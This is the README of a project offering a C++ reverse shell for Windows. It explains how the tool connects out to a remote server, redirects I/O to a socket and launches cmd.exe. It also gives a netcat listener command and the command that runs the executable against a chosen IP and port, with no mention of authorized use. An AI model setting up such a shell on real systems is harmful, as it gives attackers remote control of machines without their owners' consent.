
# Reverse Shell in C++

This project implements a simple reverse shell in C++. It establishes a connection to a remote server, redirects standard input/output/error to a socket, and allows interaction with a shell on the target system. The code is designed for Windows environments and uses Winsock for network communication.

## Getting Started
-Simply download the PowerShell or cmd release and you're good to go

### Prerequisites
- A Windows environment.
- Visual Studio or a compatible C++ compiler.

### Building the Code
1. Clone the repository to your local machine.
2. Open the project in your C++ IDE.
3. Compile and build the project.

### Running the Code
1. Start a listener on the remote server using tools like `nc` (Netcat):
   ```bash
   nc -lvnp <port>
   ```
2. Run the compiled executable with the remote server's IP and port as arguments:
   ```bash
   ./reverse_shell <server_ip> <port>
   ```

## How It Works
The code performs the following steps:
1. Initializes Winsock.
2. Creates a TCP/IP socket.
3. Connects to the remote server with the given IP and port.
4. Redirects standard input/output/error to the socket.
5. Launches `cmd.exe` with redirection, allowing interaction via the reverse shell.
6. Cleans up resources after the shell completes.

## License
GPL
